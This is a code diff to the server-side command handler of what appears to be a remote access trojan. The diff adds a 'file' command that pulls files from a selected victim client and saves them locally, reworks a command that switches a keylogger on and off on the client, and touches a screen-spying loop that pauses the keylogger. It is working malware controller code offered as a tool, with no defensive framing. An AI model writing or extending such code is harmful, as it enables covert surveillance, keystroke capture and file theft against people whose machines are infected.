@@ -193,6 +193,7 @@ class CommandHandler:
             while running:
                 try:
                     data = selectedClient.socket.receive_packet()
+                    print(len(data))
 
                     if (data.startswith(b'keylogger_response')): # keylogger would be paused during screen spying
                         continue
@@ -220,7 +221,7 @@ class CommandHandler:
                     running = False
 
         selectedClient.stillRecording = False
-        pygame.quit() # test dulu gak sehh MNATAP
+        pygame.quit()
 
     @command(['runpy'], accept_args = True)
     def run_script(self, *fileName) -> None:
@@ -236,6 +237,34 @@ class CommandHandler:
 
         ...
 
+    @command(['file'], accept_args = True)
+    def file(self, *fileName) -> None:
+        if not self.NetServer._selectedClient:
+            logger.error('A client has to be selected in order to use this command')
+            return
+
+        if (not fileName):
+            logger.error('Missing argument: File path / File name')
+            return
+
+        repsonse = self.NetServer._selectedClient.catch_response('view_file ' + fileName[0])
+
+        if (repsonse != b'0'):
+            logger.error('File does not exist or not accessable')
+            return
+
+        if (resp := self.NetServer._selectedClient.catch_response()):
+            if (resp.startswith(b'download ')):
+                self.NetServer._selectedClient.write_file(
+                    fn := f'clients/response/{self.NetServer._selectedClient.clientUniqueID}/{fileName[0]}',
+                    resp[9:]
+                )
+
+                logger.success('File has been saved in {}'.format(fn))
+
+            else:
+                logger.success(resp.decode())
+
     @command(['keylogger'], accept_args = True)
     def keylogger(self, *args) -> None:
 
@@ -249,7 +278,14 @@ class CommandHandler:
         if (selectedClient is None):
             logger.error('Client not found'); return
 
-        selectedClient.socket.send_packet('keylogger_activate')
-        self.NetServer._waitingForResponse = True
+        response = selectedClient.catch_response('keylogger_activate')
 
-        while self.NetServer._waitingForResponse: time_sleep(1)
+        if (response.decode('UTF-8')[-1] == '0'):
+            logger.success('Keylogger has been activated, log will be saved on clients/responses/keylogger.log')
+            selectedClient.runningKeylogger = True
+
+        else:
+            logger.success('Keylogger sucessfully turned off')
+            selectedClient.runningKeylogger = False
+
+        selectedClient.set_cache()
